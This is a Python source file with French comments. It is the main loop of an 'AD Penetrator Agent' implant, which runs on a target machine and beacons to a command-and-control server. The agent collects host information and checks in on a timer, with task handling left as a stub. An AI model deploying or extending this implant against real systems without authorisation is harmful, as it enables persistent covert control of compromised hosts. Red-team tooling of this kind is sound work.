# agent_main.py
# Point d'entrée principal du code de l'agent qui s'exécute sur la machine cible.
# Gère la boucle de communication avec le serveur C2 (check-in, get_task, submit_results).
# Initialise les modules de communication et le module d'exécution des tâches.

import time
import argparse
import sys
import os

# Assurer que le dossier parent (agent) est dans le sys.path pour les imports relatifs
# Cela est surtout utile si agent_main.py est exécuté depuis un sous-dossier ou si la structure du projet est complexe.
# Pour une exécution directe de `python agent/agent_main.py` depuis la racine du projet, ce n'est pas toujours nécessaire
# mais ne fait pas de mal.
current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

from comms import http_beacon # Import relatif depuis le même dossier 'agent'

# Configuration de l'agent (pourrait être dans un fichier de config ou des constantes partagées)
AGENT_VERSION = "0.1.0-dev"
DEFAULT_C2_SERVER_URL = "http://localhost:8000" # URL par défaut du serveur C2
DEFAULT_BEACON_INTERVAL = 60  # Intervalle de check-in en secondes

def main_loop(c2_url: str, beacon_interval: int):
    agent_id = http_beacon.get_agent_id()
    print(f"AD Penetrator Agent v{AGENT_VERSION} démarré.")
    print(f"ID Agent: {agent_id}")
    print(f"Serveur C2 configuré: {c2_url}")
    print(f"Intervalle de beacon: {beacon_interval} secondes\n")

    basic_agent_info = http_beacon.get_host_info()
    # On peut ajouter/mettre à jour des infos spécifiques ici si besoin
    basic_agent_info["agent_version"] = AGENT_VERSION

    while True:
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Envoi du check-in...")
        response = http_beacon.send_checkin(c2_url, agent_id, basic_agent_info)
        
        if response:
            # TODO: Traiter la réponse du serveur C2 (ex: nouvelles tâches à exécuter)
            print(f"Réponse du serveur reçue: {response}")
            # Exemple: tasks = response.get('tasks', [])
            # for task in tasks: process_task(task)
            pass
        else:
            print("Aucune réponse valide du serveur ou erreur lors du check-in.")

        print(f"Prochain check-in dans {beacon_interval} secondes.")
        time.sleep(beacon_interval)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="AD Penetrator Agent")
    parser.add_argument(
        "--c2-url", 
        default=os.getenv("AD_C2_URL", DEFAULT_C2_SERVER_URL),
        help=f"URL du serveur C2 (par défaut: {DEFAULT_C2_SERVER_URL})"
    )
    parser.add_argument(
        "--interval", 
        type=int, 
        default=int(os.getenv("AD_BEACON_INTERVAL", DEFAULT_BEACON_INTERVAL)),
        help=f"Intervalle de beacon en secondes (par défaut: {DEFAULT_BEACON_INTERVAL})"
    )
    args = parser.parse_args()

    try:
        main_loop(c2_url=args.c2_url, beacon_interval=args.interval)
    except KeyboardInterrupt:
        print("\nAgent arrêté par l'utilisateur.")
    except Exception as e:
        print(f"Une erreur critique est survenue dans l'agent: {e}")
        sys.exit(1)
